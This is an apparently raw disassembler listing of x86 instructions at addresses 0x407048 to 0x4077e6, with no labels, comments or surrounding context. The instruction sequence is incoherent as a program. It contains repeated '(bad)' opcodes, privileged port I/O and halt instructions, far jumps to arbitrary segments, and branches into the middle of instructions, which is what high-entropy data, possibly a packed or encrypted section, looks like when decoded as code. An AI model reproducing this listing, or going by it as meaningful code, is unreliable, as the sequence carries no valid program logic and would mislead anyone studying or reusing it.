  407048:	fsubrp st(5),st
  40704a:	js     0x407038
  40704c:	scas   eax,DWORD PTR es:[edi]
  40704d:	inc    edx
  40704e:	xor    esp,ebx
  407050:	leave  
  407051:	pop    es
  407052:	cmc    
  407053:	adc    ecx,DWORD PTR [esp+edi*8]
  407056:	push   ss
  407057:	xchg   esi,eax
  407058:	mov    WORD PTR [ebp+ecx*8-0x5e],cs
  40705c:	lds    ebx,FWORD PTR [edx]
  40705e:	pusha  
  40705f:	addr16 in eax,dx
  407061:	dec    edx
  407062:	and    ax,0xb805
  407066:	cmp    cl,dl
  407068:	dec    edi
  407069:	add    DWORD PTR [ecx],ebp
  40706b:	stc    
  40706c:	cld    
  40706d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40706f:	push   ds
  407070:	pushf  
  407071:	xchg   esp,eax
  407072:	push   ebp
  407073:	sbb    ebp,eax
  407075:	je     0x40704a
  407077:	(bad)  
  407078:	js     0x40709c
  40707a:	repz imul ebx,DWORD PTR [edx-0xab3eaa7],0x25
  407082:	mov    ecx,0x5a07ecec
  407087:	and    ebp,DWORD PTR [edx+0x4e9855c2]
  40708d:	sti    
  40708e:	sbb    al,0x86
  407090:	js     0x4070fa
  407092:	jne    0x40709e
  407094:	scas   al,BYTE PTR es:[edi]
  407095:	cwde   
  407096:	outs   dx,DWORD PTR ds:[esi]
  407097:	mov    bh,0x5b
  407099:	ja     0x40710e
  40709b:	jecxz  0x4070ea
  40709d:	or     al,0x32
  40709f:	adc    edi,DWORD PTR [edi+0x79]
  4070a2:	imul   ebx,DWORD PTR [edi-0x3bed13c9],0xd9b30a4e
  4070ac:	loop   0x407069
  4070ae:	popa   
  4070af:	jne    0x40711e
  4070b1:	dec    eax
  4070b2:	xchg   ebx,eax
  4070b3:	test   ah,al
  4070b5:	jns    0x4070ca
  4070b7:	xor    eax,0xd29e832c
  4070bc:	cmp    bl,bl
  4070be:	dec    edx
  4070bf:	jge    0x407102
  4070c1:	mov    bl,0x41
  4070c3:	stos   DWORD PTR es:[edi],eax
  4070c4:	out    dx,eax
  4070c5:	jno    0x4070c2
  4070c7:	pusha  
  4070c8:	mov    bh,0x93
  4070ca:	adc    bl,bl
  4070cc:	nop
  4070cd:	jae    0x4070c0
  4070cf:	mov    dh,0x6b
  4070d1:	or     eax,0x85e4a62d
  4070d6:	cmp    esp,DWORD PTR [edx-0x58]
  4070d9:	add    BYTE PTR [esi],ah
  4070db:	jl     0x407105
  4070dd:	call   0x1e482fe4
  4070e2:	shr    BYTE PTR ds:0x1da5e4a8,0xe8
  4070e9:	lea    edi,[eax]
  4070eb:	ror    BYTE PTR [ebp-0x2],0x8e
  4070ef:	jne    0x4070fb
  4070f1:	nop
  4070f2:	pop    es
  4070f3:	call   0xaa23:0x6f4f21d4
  4070fa:	inc    esp
  4070fb:	call   FWORD PTR [eax+ecx*1-0x6e761091]
  407102:	jns    0x407156
  407104:	inc    edi
  407105:	(bad)  
  407106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407107:	sbb    al,0x62
  407109:	mov    ds:0x8c222cdb,eax
  40710e:	std    
  40710f:	aam    0x68
  407111:	pop    ebp
  407112:	mov    bh,0xfd
  407114:	jb     0x407169
  407116:	xor    bh,BYTE PTR [ebx-0x7eb23d10]
  40711c:	xchg   esp,eax
  40711d:	lock icebp 
  40711f:	cmp    eax,0xdc9b9639
  407124:	rcr    DWORD PTR [ebx+eax*1-0x7c7a4dc1],0xf1
  40712c:	leave  
  40712d:	aad    0xc9
  40712f:	das    
  407130:	xor    BYTE PTR [ebx+ecx*2],al
  407133:	mov    bh,BYTE PTR [ebp-0x5633015]
  407139:	fidiv  WORD PTR [eax]
  40713b:	and    DWORD PTR [eax],edi
  40713d:	adc    bh,BYTE PTR [esi-0x2f39d554]
  407143:	adc    DWORD PTR [eax+0x5847d347],esp
  407149:	xchg   DWORD PTR [ecx],ecx
  40714b:	mov    ds:0x15bee4e0,al
  407150:	mov    ah,0xdd
  407152:	hlt    
  407153:	loopne 0x407121
  407155:	out    0x10,al
  407157:	scas   al,BYTE PTR es:[edi]
  407158:	push   es
  407159:	cmp    eax,0x31289ca0
  40715e:	fadd   QWORD PTR [esi-0x11]
  407161:	sbb    ebp,edx
  407163:	xchg   ebx,eax
  407164:	pop    edx
  407165:	jp     0x407142
  407167:	cmp    al,0x73
  407169:	das    
  40716a:	cmp    al,0xfa
  40716c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40716d:	ins    DWORD PTR es:[edi],dx
  40716e:	pop    esp
  40716f:	mov    ebx,0x7a0dd7e9
  407174:	fbstp  TBYTE PTR [eax-0x44c18110]
  40717a:	cmp    DWORD PTR [bx+0x1a],0xffffff89
  40717f:	fld    TBYTE PTR [edx-0x77]
  407182:	stos   DWORD PTR es:[edi],eax
  407183:	xchg   DWORD PTR [ebx+0x2ab2bc01],edx
  407189:	sbb    DWORD PTR [ebx],0x5342e7f5
  40718f:	les    esp,FWORD PTR [edi]
  407191:	clc    
  407192:	outs   dx,BYTE PTR ds:[esi]
  407193:	es jecxz 0x4071e6
  407196:	scas   eax,DWORD PTR es:[edi]
  407197:	sahf   
  407198:	mov    ah,0xd6
  40719a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40719b:	mov    esi,eax
  40719d:	ror    BYTE PTR [edi-0x49],1
  4071a0:	gs inc ecx
  4071a2:	out    0x18,al
  4071a4:	sahf   
  4071a5:	dec    edx
  4071a6:	loope  0x407161
  4071a8:	(bad)  [esi-0x47]
  4071ab:	dec    ebx
  4071ac:	in     al,0x19
  4071ae:	(bad)  
  4071b0:	fist   WORD PTR [ebx-0x7218c168]
  4071b6:	push   ebx
  4071b7:	aas    
  4071b8:	clc    
  4071b9:	out    dx,eax
  4071ba:	pop    eax
  4071bb:	mov    bl,0xbc
  4071bd:	test   eax,0xac4165b9
  4071c2:	je     0x407172
  4071c4:	into   
  4071c5:	dec    ebp
  4071c6:	ret    
  4071c7:	sub    ebx,DWORD PTR [ebp+0x1c]
  4071ca:	push   edx
  4071cb:	sbb    cl,0xb4
  4071ce:	push   0xc89fe89e
  4071d3:	mov    ch,0xd7
  4071d5:	inc    esi
  4071d6:	cmp    ebx,DWORD PTR [esi]
  4071d8:	xor    DWORD PTR [edi],ebx
  4071da:	add    eax,0xddce891
  4071df:	mov    edi,0x90d8b544
  4071e4:	(bad)  
  4071e6:	inc    edx
  4071e7:	stos   BYTE PTR es:[edi],al
  4071e8:	popa   
  4071e9:	cmp    DWORD PTR [esi],0x7c
  4071ec:	and    eax,ebx
  4071ee:	je     0x40722a
  4071f0:	(bad)  [edi+0x1a6d23b3]
  4071f6:	iret   
  4071f7:	mov    bh,0x4c
  4071f9:	push   eax
  4071fa:	div    DWORD PTR [ecx-0x50f9d13]
  407200:	push   cs
  407201:	or     cl,BYTE PTR [ecx+0x2c8216f7]
  407207:	cmp    eax,0x9458f287
  40720c:	sbb    bh,BYTE PTR [ebp-0x19]
  40720f:	jecxz  0x4071e3
  407211:	loop   0x407270
  407213:	pop    esp
  407214:	mov    eax,ds:0xad2a71db
  407219:	dec    esi
  40721a:	and    eax,edi
  40721c:	lods   eax,DWORD PTR ds:[esi]
  40721d:	sbb    ebx,edx
  40721f:	ror    BYTE PTR [ebx],0xe4
  407222:	xchg   edx,eax
  407223:	rol    DWORD PTR [ebp+0x708285c8],cl
  407229:	inc    eax
  40722a:	stos   BYTE PTR es:[edi],al
  40722b:	nop
  40722c:	xchg   BYTE PTR [bp+si-0x2b5c],cl
  407231:	js     0x40728d
  407233:	not    BYTE PTR ds:0x50073751
  407239:	nop
  40723a:	pop    DWORD PTR [ebp-0x39d20f01]
  407240:	fldenv [ecx-0x4f]
  407243:	cmp    eax,0x26a8dd75
  407248:	push   ds
  407249:	icebp  
  40724a:	dec    ebp
  40724b:	shr    DWORD PTR [ebx],1
  40724d:	ds es xchg edx,eax
  407250:	inc    esi
  407251:	inc    esp
  407252:	mov    ch,BYTE PTR [eax+0x4df41aee]
  407258:	pop    edx
  407259:	(bad)  
  40725b:	push   0x76
  40725d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40725e:	cmp    al,0x62
  407260:	push   eax
  407261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407262:	jp     0x4071ff
  407264:	lea    edi,[eax]
  407266:	in     al,0x10
  407268:	(bad)  
  407269:	push   esi
  40726a:	iret   
  40726b:	sub    BYTE PTR ds:0x668f1c16,bh
  407271:	loopne 0x407295
  407273:	xchg   ebx,eax
  407274:	cmp    eax,0x6abbc676
  407279:	xchg   ebp,eax
  40727a:	inc    ecx
  40727b:	cwde   
  40727c:	fs xchg esi,eax
  40727e:	jecxz  0x407256
  407280:	push   ds
  407281:	scas   eax,DWORD PTR es:[edi]
  407282:	adc    edx,DWORD PTR [edx-0x63310c34]
  407288:	jmp    0x2643:0x96f6c1f9
  40728f:	mov    al,ds:0x7e073875
  407294:	sahf   
  407295:	clc    
  407296:	jmp    0x407242
  407298:	mov    eax,0xbecbbbad
  40729d:	in     al,0x4c
  40729f:	mov    esi,0xb1f37b6d
  4072a4:	xor    cl,BYTE PTR [eax-0x1a4ed1a9]
  4072aa:	fild   WORD PTR ds:0x3771b7f9
  4072b0:	dec    edi
  4072b1:	aam    0x31
  4072b3:	in     eax,0xc8
  4072b5:	pop    es
  4072b6:	and    esp,esp
  4072b8:	mov    eax,ds:0x3f5819f1
  4072bd:	mov    ebx,0xef31432e
  4072c2:	mov    ebx,0x4d1daa94
  4072c7:	ret    
  4072c8:	mov    WORD PTR [eax],?
  4072ca:	aas    
  4072cb:	jge    0x407322
  4072cd:	mov    ebx,0x3999b7e0
  4072d2:	ret    0xc430
  4072d5:	mov    bh,0xc4
  4072d7:	push   edi
  4072d8:	and    BYTE PTR [ebp+0x4a1d13b0],dh
  4072de:	lds    edi,FWORD PTR [edi+0xc]
  4072e1:	jns    0x4072b5
  4072e3:	cmp    ah,bl
  4072e5:	int    0xc5
  4072e7:	jmp    0x407305
  4072e9:	mov    ch,0x71
  4072eb:	pop    ebp
  4072ec:	add    BYTE PTR [edi],ah
  4072ee:	add    edi,esi
  4072f0:	jo     0x4072fa
  4072f2:	mov    ebp,0xefdf0b4e
  4072f7:	lods   eax,DWORD PTR ds:[esi]
  4072f8:	aaa    
  4072f9:	mov    eax,0xf394c12e
  4072fe:	jmp    0x69c0c563
  407303:	xchg   esi,eax
  407304:	out    0xaf,eax
  407306:	jmp    0xc4eede44
  40730b:	fcomp  DWORD PTR [eax-0x15f88e18]
  407311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407312:	jl     0x40736a
  407314:	call   DWORD PTR [ebp+0x2db01fe1]
  40731a:	hlt    
  40731b:	into   
  40731c:	push   esp
  40731d:	sbb    ebp,DWORD PTR es:[eax+0x5d0f413c]
  407324:	pop    ebx
  407325:	xchg   edi,eax
  407326:	repnz in al,0xf9
  407329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40732a:	mov    edi,ecx
  40732c:	scas   eax,DWORD PTR es:[edi]
  40732d:	into   
  40732e:	push   ss
  40732f:	and    DWORD PTR [ebx+0x66],ecx
  407332:	inc    ebp
  407333:	js     0x4072e1
  407335:	mov    ebp,0xf889a38e
  40733a:	add    dl,BYTE PTR [ecx-0x5e]
  40733d:	jo     0x407367
  40733f:	adc    esi,DWORD PTR [edi+eiz*2]
  407342:	out    dx,eax
  407343:	sbb    bl,bl
  407345:	int    0x78
  407347:	sbb    DWORD PTR [edx+0x199c120a],ecx
  40734d:	adc    esi,DWORD PTR [ebp-0x30]
  407350:	aas    
  407351:	in     al,0x91
  407353:	dec    esi
  407354:	aad    0x90
  407356:	mov    edx,0x40dfc3c4
  40735b:	icebp  
  40735c:	and    eax,edx
  40735e:	jecxz  0x4073b5
  407360:	mov    cl,0x5b
  407362:	mov    eax,0xf09e1819
  407367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407368:	push   ds
  407369:	push   edx
  40736a:	in     al,0x19
  40736c:	inc    eax
  40736d:	xchg   esp,eax
  40736e:	push   ecx
  40736f:	or     al,0x9f
  407371:	ret    0xe1e2
  407374:	push   DWORD PTR [ecx]
  407376:	mov    bl,0x95
  407378:	js     0x4073c2
  40737a:	and    DWORD PTR [esp+edx*4+0x402e4383],eax
  407381:	fcomp  DWORD PTR gs:[esi*1-0x7ae3e2a3]
  407389:	jmp    0x9b26:0xfb4221a2
  407390:	dec    edx
  407391:	aaa    
  407392:	sub    dh,cl
  407394:	mov    edi,DWORD PTR [edx-0x27]
  407397:	dec    edi
  407398:	js     0x40734c
  40739a:	mov    al,0xf4
  40739c:	out    dx,eax
  40739d:	aad    0xfc
  40739f:	out    0xa3,eax
  4073a1:	jl     0x4073a4
  4073a3:	dec    eax
  4073a4:	mov    ebp,DWORD PTR [edx+eax*8-0x33780b47]
  4073ab:	jns    0x4073b4
  4073ad:	sub    eax,0xa4bd9db8
  4073b2:	lods   eax,DWORD PTR ds:[esi]
  4073b3:	add    edx,DWORD PTR [ecx-0x78]
  4073b6:	fsubr  QWORD PTR [ecx-0x64]
  4073b9:	ins    BYTE PTR es:[edi],dx
  4073ba:	(bad)  
  4073bb:	outs   dx,BYTE PTR ds:[esi]
  4073bc:	dec    ecx
  4073bd:	cs hlt 
  4073bf:	mov    ds,WORD PTR [ecx+0x23]
  4073c2:	scas   al,BYTE PTR es:[edi]
  4073c3:	dec    esi
  4073c4:	or     ah,BYTE PTR [edi]
  4073c6:	(bad)  
  4073c7:	test   eax,0x50e16e4f
  4073cc:	scas   al,BYTE PTR es:[edi]
  4073cd:	push   ds
  4073ce:	adc    esi,DWORD PTR [ebx-0x9b6737]
  4073d4:	ret    0xd442
  4073d7:	push   ds
  4073d8:	sub    eax,DWORD PTR [eax+0x46]
  4073db:	mov    ebx,0x95f1f1e0
  4073e0:	push   ebp
  4073e1:	lods   al,BYTE PTR ds:[esi]
  4073e2:	xchg   esp,eax
  4073e3:	loope  0x40740a
  4073e5:	add    al,0x3c
  4073e7:	xor    eax,0xacd7d135
  4073ec:	cmp    ch,dl
  4073ee:	neg    BYTE PTR [esi+0x17582a40]
  4073f4:	xor    cl,al
  4073f6:	mov    ds:0xd47cc7b8,al
  4073fb:	push   esp
  4073fc:	mov    esp,DWORD PTR [edx-0x24]
  4073ff:	lds    ecx,FWORD PTR [edi+edi*4-0x4a]
  407403:	and    al,BYTE PTR [ebx+0x21790a23]
  407409:	ds inc ecx
  40740b:	out    0x72,eax
  40740d:	xchg   esp,eax
  40740e:	or     eax,0x9d707ba9
  407413:	ret    0xc5fb
  407416:	push   0x11
  407418:	push   0x889fed73
  40741d:	cld    
  40741e:	mov    ecx,eax
  407420:	mov    WORD PTR [eax-0x661b7549],es
  407426:	mov    ds:0xf43f817d,al
  40742b:	shl    DWORD PTR [edi+0x6e],1
  40742e:	out    0xf7,al
  407430:	and    BYTE PTR [ebx-0x59],0xe6
  407434:	sub    eax,0x40a85fd8
  407439:	aas    
  40743a:	sbb    al,0xa2
  40743c:	sbb    DWORD PTR [ecx+0x21d64fcf],ebx
  407442:	loop   0x4073e6
  407444:	or     bl,BYTE PTR [edi+0x2eff8467]
  40744a:	xchg   edx,eax
  40744b:	inc    esp
  40744c:	mov    al,ds:0x574ae6dc
  407451:	enter  0xfcc,0x1d
  407455:	loope  0x40749c
  407457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407458:	or     BYTE PTR ds:0x6f0ede83,ah
  40745e:	sub    BYTE PTR [ebx+edx*4-0x71],bh
  407462:	xor    esi,DWORD PTR [ebx]
  407464:	or     esp,ebx
  407466:	ret    0x1442
  407469:	mov    al,0x6f
  40746b:	or     edi,ebx
  40746d:	and    edx,DWORD PTR [esi+ebx*4-0x31cc3fd]
  407474:	pop    ss
  407475:	mov    WORD PTR [eax+0x96c2ddb],ds
  40747b:	fucom  st(3)
  40747d:	pop    edx
  40747e:	loope  0x4074ff
  407480:	sub    ah,BYTE PTR [esi-0x2a]
  407483:	mul    esi
  407485:	add    eax,0x7551d333
  40748a:	call   0x4bf0666a
  40748f:	ja     0x4074a8
  407491:	iret   
  407492:	out    0x73,eax
  407494:	bound  ebx,QWORD PTR [edi]
  407496:	pop    ecx
  407497:	pop    edi
  407498:	lock lds eax,FWORD PTR [ebp+ecx*1-0x57]
  40749d:	inc    ecx
  40749e:	xor    al,0xf
  4074a0:	rcl    BYTE PTR [esi-0x5993841a],0x64
  4074a7:	lods   eax,DWORD PTR ds:[esi]
  4074a8:	fadd   st,st(5)
  4074aa:	jmp    0x4074e6
  4074ac:	rcl    BYTE PTR [ebx+eax*2+0x2f],0xf3
  4074b1:	push   ebp
  4074b2:	(bad)  
  4074b3:	mov    cl,0x56
  4074b5:	fcmove st,st(6)
  4074b7:	sub    al,0xf
  4074b9:	xor    BYTE PTR [ecx+0x49],0x3e
  4074bd:	(bad)  
  4074be:	hlt    
  4074bf:	ficom  WORD PTR [ecx+0x22]
  4074c2:	shl    esp,cl
  4074c4:	int3   
  4074c5:	aaa    
  4074c6:	les    esp,FWORD PTR [eax+0x1]
  4074c9:	jecxz  0x40748f
  4074cb:	retf   0x9f01
  4074ce:	nop
  4074cf:	fs in  eax,dx
  4074d1:	mov    cl,0x24
  4074d3:	xchg   BYTE PTR ds:0x18344096,dl
  4074d9:	cmp    DWORD PTR [ebx],ebx
  4074db:	pop    ebp
  4074dc:	bound  esp,QWORD PTR [edx]
  4074de:	jge    0x407537
  4074e0:	push   ebx
  4074e1:	xchg   esp,eax
  4074e2:	add    edx,ecx
  4074e4:	les    edx,FWORD PTR [ebp+0x772548a3]
  4074ea:	sub    DWORD PTR [ebp+0x61d7b893],ebx
  4074f0:	sub    esi,ecx
  4074f2:	ins    DWORD PTR es:[edi],dx
  4074f3:	jae    0x407503
  4074f5:	fcomp  DWORD PTR [ecx-0x3689064f]
  4074fb:	adc    al,0xbf
  4074fd:	imul   ebx,DWORD PTR [ebx+ebx*1+0x68],0xa
  407502:	pop    ebp
  407503:	fcmovne st,st(6)
  407505:	retf   
  407506:	dec    eax
  407507:	or     BYTE PTR [esi-0xcc47561],ch
  40750d:	mov    ch,0x94
  40750f:	xchg   bl,al
  407511:	(bad)  
  407512:	and    DWORD PTR [ecx-0x32],eax
  407515:	fiadd  WORD PTR [ebx]
  407517:	or     bl,bh
  407519:	shl    DWORD PTR cs:[esp+edx*4-0x1abc2ec4],cl
  407521:	sti    
  407522:	outs   dx,DWORD PTR ds:[esi]
  407523:	xchg   esp,eax
  407524:	aam    0x67
  407526:	ss in  eax,0x28
  407529:	daa    
  40752a:	xchg   esi,eax
  40752b:	imul   esp,ebp,0x6c
  40752e:	pop    ds
  40752f:	je     0x40756f
  407531:	(bad)  [edi]
  407533:	jae    0x407592
  407535:	outs   dx,DWORD PTR ds:[esi]
  407536:	fidiv  WORD PTR [edx+0x1dfe674d]
  40753c:	lea    esi,[edi-0x6e]
  40753f:	push   eax
  407540:	not    DWORD PTR [edx]
  407542:	inc    edi
  407543:	call   0x1a2314d5
  407548:	(bad)  
  407549:	and    al,0x70
  40754b:	enter  0x5104,0x50
  40754f:	sbb    esp,DWORD PTR cs:[edx]
  407552:	scas   eax,DWORD PTR es:[edi]
  407553:	and    BYTE PTR [eax],ah
  407555:	jo     0x40757e
  407557:	jbe    0x4075b7
  407559:	inc    edi
  40755a:	xor    ebx,DWORD PTR [edx+edx*1]
  40755d:	xlat   BYTE PTR ds:[ebx]
  40755e:	es aad 0x8c
  407561:	add    dh,BYTE PTR [edx]
  407563:	fwait
  407564:	sbb    al,0xea
  407566:	int    0x2d
  407568:	pop    edi
  407569:	sub    DWORD PTR [edx+0x24cc4640],0xffffffab
  407570:	push   DWORD PTR [edx+edx*2+0x1a66c389]
  407577:	add    cl,BYTE PTR [edx+0x12055adf]
  40757d:	pop    ebp
  40757e:	xor    cl,0xa4
  407581:	push   eax
  407582:	mov    DWORD PTR [ebp-0x22df94b3],edx
  407588:	mov    ebp,0x601f39e
  40758d:	stos   DWORD PTR es:[edi],eax
  40758e:	dec    eax
  40758f:	push   0xffffffa3
  407591:	ror    BYTE PTR [esi*2+0x59e9133e],1
  407598:	push   0xe
  40759a:	int    0x81
  40759c:	sbb    BYTE PTR [ebp*2-0x60c727fe],ah
  4075a3:	mov    ebp,0x350e450
  4075a8:	dec    eax
  4075a9:	cmp    cx,0x70
  4075ad:	mov    al,ds:0xf15096b
  4075b2:	lock int3 
  4075b4:	fwait
  4075b5:	pop    edx
  4075b6:	out    0xff,eax
  4075b8:	mov    WORD PTR [ebp-0x18],ss
  4075bb:	or     DWORD PTR [edi],esp
  4075bd:	xchg   ebx,eax
  4075be:	sbb    eax,DWORD PTR [ecx+eiz*4-0x21]
  4075c2:	jecxz  0x4075aa
  4075c4:	out    0x63,al
  4075c6:	loopne 0x40758f
  4075c8:	fdiv   st,st(3)
  4075ca:	xchg   esp,eax
  4075cb:	sub    al,BYTE PTR ds:[edi+0x5319a79f]
  4075d2:	jo     0x4075e4
  4075d4:	rcl    DWORD PTR [eax-0x13],cl
  4075d7:	xor    BYTE PTR [ecx-0x27],bh
  4075da:	lods   al,BYTE PTR ds:[esi]
  4075db:	ret    
  4075dc:	push   0xb3fc39e8
  4075e1:	inc    eax
  4075e2:	push   0x3e456e03
  4075e7:	enter  0x90bd,0x18
  4075eb:	inc    esp
  4075ec:	adc    esp,edx
  4075ee:	je     0x407596
  4075f0:	cmp    edx,DWORD PTR [edi+0x7738984f]
  4075f6:	mov    edx,0x63b1a892
  4075fb:	or     al,0xe8
  4075fd:	mov    DWORD PTR [edi+0x43ccccfc],ebp
  407603:	mul    DWORD PTR [eax+edx*4-0x71]
  407607:	sahf   
  407608:	fsubr  DWORD PTR [ebp+esi*4-0x52]
  40760c:	xor    eax,0xccf38dcd
  407611:	adc    edx,esp
  407613:	and    esp,DWORD PTR [esi+0x6e]
  407616:	sub    BYTE PTR [esi+edx*4],cl
  407619:	pop    eax
  40761a:	push   ds
  40761b:	fadd   DWORD PTR [eax]
  40761d:	jno    0x407695
  40761f:	hlt    
  407620:	inc    edi
  407621:	push   es
  407622:	xor    bl,BYTE PTR [edi+0x4f]
  407625:	jg     0x4075c4
  407627:	sbb    BYTE PTR [ebp+0x5484169f],bh
  40762d:	mov    dh,0x46
  40762f:	xlat   BYTE PTR ds:[ebx]
  407630:	(bad)  
  407631:	or     esi,esp
  407633:	(bad)  
  407634:	adc    al,0xad
  407636:	cld    
  407637:	dec    esi
  407638:	pop    eax
  407639:	fistp  WORD PTR [edi+0x391348c4]
  40763f:	xor    dh,BYTE PTR [esi]
  407641:	sub    al,BYTE PTR [ecx]
  407643:	cdq    
  407644:	pop    ebp
  407645:	add    eax,DWORD PTR [edx+edx*4+0x3911462d]
  40764c:	push   0xffffffbd
  40764e:	xchg   esi,eax
  40764f:	jne    0x4076aa
  407651:	xor    BYTE PTR [eax],dh
  407653:	jbe    0x407669
  407655:	jnp    0x4075d8
  407657:	inc    edx
  407658:	ret    0xee1b
  40765b:	outs   dx,BYTE PTR ds:[esi]
  40765c:	clc    
  40765d:	std    
  40765e:	cmp    edx,DWORD PTR [eax]
  407660:	pop    ebx
  407661:	mov    ds:0x9b518014,al
  407666:	addr16 mov dh,0xeb
  407669:	inc    edx
  40766a:	call   0x1c8bec0
  40766f:	add    bl,BYTE PTR [ebx+0x12]
  407672:	out    dx,al
  407673:	sbb    eax,0x364ad399
  407678:	add    BYTE PTR [ebp+0x3e],bh
  40767b:	hlt    
  40767c:	sbb    al,0x2d
  40767e:	push   0x73
  407680:	sti    
  407681:	mov    al,0x75
  407683:	push   edx
  407684:	js     0x40760c
  407686:	fimul  WORD PTR [edi+0x8abb184]
  40768c:	pop    eax
  40768d:	mov    ebx,0x1ffa2a3a
  407692:	xor    BYTE PTR [ebp-0x29de4161],0x98
  407699:	sbb    eax,0xebc4a0b2
  40769e:	push   ebp
  40769f:	pop    edx
  4076a0:	jecxz  0x4076a8
  4076a2:	sbb    cl,dh
  4076a4:	aam    0x51
  4076a6:	cmp    eax,0x19b2ed13
  4076ab:	mov    bh,0xdd
  4076ad:	scas   eax,DWORD PTR es:[edi]
  4076ae:	in     al,0x94
  4076b0:	(bad)  
  4076b1:	sti    
  4076b2:	cld    
  4076b3:	jg     0x40767b
  4076b5:	adc    BYTE PTR [ebx+0x2f2bf413],0x30
  4076bc:	inc    edx
  4076bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076be:	mov    ds:0xbf51ba43,al
  4076c3:	xor    esp,DWORD PTR [eax-0x57]
  4076c6:	repz dec ebx
  4076c8:	xchg   ecx,eax
  4076c9:	adc    esi,DWORD PTR [ecx]
  4076cb:	shl    BYTE PTR [ebp+ebp*2+0x46487426],1
  4076d2:	pop    ecx
  4076d3:	cmp    eax,ebp
  4076d5:	push   edi
  4076d6:	pop    ebx
  4076d7:	xor    BYTE PTR [edx+0x2a85f9c2],dh
  4076dd:	jbe    0x40769e
  4076df:	out    dx,eax
  4076e0:	push   esi
  4076e1:	dec    ebp
  4076e2:	mov    ds:0x1e3b95e3,al
  4076e7:	lods   al,BYTE PTR ds:[esi]
  4076e8:	lods   al,BYTE PTR ds:[esi]
  4076e9:	ins    BYTE PTR es:[edi],dx
  4076ea:	adc    al,dl
  4076ec:	add    DWORD PTR [eax+edx*8],ebx
  4076ef:	mul    ecx
  4076f1:	pusha  
  4076f2:	scas   eax,DWORD PTR es:[edi]
  4076f3:	sbb    esi,DWORD PTR [ecx-0x2a]
  4076f6:	sbb    al,0xe9
  4076f8:	out    0xf1,al
  4076fa:	ror    BYTE PTR [ecx+eax*2-0x14],cl
  4076fe:	add    DWORD PTR [edi+0x17],esi
  407701:	push   esi
  407702:	and    BYTE PTR [eax],0xb2
  407705:	pop    ds
  407706:	scas   eax,DWORD PTR es:[edi]
  407707:	cdq    
  407708:	aas    
  407709:	repz dec ebx
  40770b:	ja     0x407723
  40770d:	outs   dx,BYTE PTR ds:[esi]
  40770e:	add    dl,BYTE PTR [ebx+edi*1-0x270e1818]
  407715:	dec    esp
  407716:	lea    ecx,[edx]
  407718:	cmp    DWORD PTR [edx+0x4c],ebp
  40771b:	and    edx,DWORD PTR [edi+edi*4-0xf]
  40771f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407720:	and    DWORD PTR [edx-0x4bf56d46],0xffffff9e
  407727:	mov    cs,edx
  407729:	in     al,0x82
  40772b:	sub    BYTE PTR [ebp-0x70],0x65
  40772f:	je     0x4076c3
  407731:	in     eax,0x5c
  407733:	pusha  
  407734:	add    eax,0x86dffc27
  407739:	adc    cl,BYTE PTR [ecx+ebp*2]
  40773c:	push   esp
  40773d:	fcmovnu st,st(0)
  40773f:	int    0xe0
  407741:	rcl    BYTE PTR [ebp-0x1e5092c4],1
  407747:	push   esp
  407748:	cs pop ebp
  40774a:	pushf  
  40774b:	pop    ecx
  40774c:	add    bh,dh
  40774e:	push   ebx
  40774f:	or     BYTE PTR [edi],bl
  407751:	rcr    DWORD PTR [edi],cl
  407753:	(bad)  
  407754:	jmp    0x407715
  407756:	sbb    ch,BYTE PTR [esi+0x2bef092c]
  40775c:	fcom   DWORD PTR cs:[ebx]
  40775f:	add    al,0xb
  407761:	adc    DWORD PTR [esp+esi*2-0x67],ecx
  407765:	add    ebx,ebp
  407767:	xchg   ebp,eax
  407768:	pop    ecx
  407769:	xchg   esp,eax
  40776a:	arpl   WORD PTR [esi],si
  40776c:	pop    es
  40776d:	ss cld 
  40776f:	push   ss
  407770:	pop    ss
  407771:	stos   DWORD PTR es:[edi],eax
  407772:	or     ebx,DWORD PTR [eax-0x5b]
  407775:	dec    edi
  407776:	les    eax,FWORD PTR [esi]
  407778:	jg     0x4077b9
  40777a:	dec    ebx
  40777b:	pop    eax
  40777c:	lahf   
  40777d:	lods   eax,DWORD PTR ds:[esi]
  40777e:	xchg   edi,eax
  40777f:	imul   ecx,DWORD PTR [ebp+0x7141e19],0x3414c8e8
  407789:	xor    BYTE PTR es:0x3f5ab464,ah
  407790:	xchg   ebp,eax
  407791:	pop    ebx
  407792:	pop    es
  407793:	jl     0x40776f
  407795:	add    bh,ah
  407797:	icebp  
  407798:	cmp    edi,DWORD PTR [ecx]
  40779a:	add    DWORD PTR [esi-0x71],esp
  40779d:	cmp    al,0x41
  40779f:	ds inc edx
  4077a1:	daa    
  4077a2:	into   
  4077a3:	loope  0x4077f4
  4077a5:	push   edx
  4077a6:	mov    edx,0x8213f9be
  4077ab:	fwait
  4077ac:	push   0xa9365370
  4077b1:	and    ch,BYTE PTR [ebx-0x60]
  4077b4:	lds    eax,FWORD PTR [edx]
  4077b6:	sub    eax,0x277ac39a
  4077bb:	adc    DWORD PTR [esp+ebp*4],0x1a
  4077bf:	stos   DWORD PTR es:[edi],eax
  4077c0:	pusha  
  4077c1:	cmc    
  4077c2:	fwait
  4077c3:	out    dx,eax
  4077c4:	ret    0x6634
  4077c7:	adc    edx,esp
  4077c9:	stos   DWORD PTR es:[edi],eax
  4077ca:	jecxz  0x407827
  4077cc:	add    edi,DWORD PTR [edx-0x19]
  4077cf:	cmp    al,bl
  4077d1:	(bad)  
  4077d3:	xchg   esp,eax
  4077d4:	sbb    eax,0x9f3f7f3b
  4077d9:	popa   
  4077da:	scas   al,BYTE PTR es:[edi]
  4077db:	fcom   st(2)
  4077dd:	lods   al,BYTE PTR ds:[esi]
  4077de:	sub    bh,ah
  4077e0:	dec    esp
  4077e1:	xchg   edi,eax
  4077e2:	jecxz  0x407823
  4077e4:	jo     0x407848
  4077e6:	neg    DWORD PTR [edx-0x1]
